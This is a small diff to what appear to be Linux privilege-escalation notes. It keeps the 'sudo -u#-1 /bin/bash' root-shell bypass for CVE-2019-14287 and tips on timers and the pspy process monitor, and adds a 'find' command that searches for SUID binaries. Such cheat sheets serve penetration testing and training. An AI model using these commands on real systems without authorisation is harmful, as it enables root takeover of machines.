@@ -2,6 +2,7 @@
 Introduction
 
 username ALL=(ALL,!root) /bin/bash sudo -u#-1 /bin/bash (CVE 2019 14287)
+find / -perm -u=s -type f 2>/dev/null
 
 cron Timer - systemctl list-timers
 pspy - monitor linux processor (download 64 bit version)
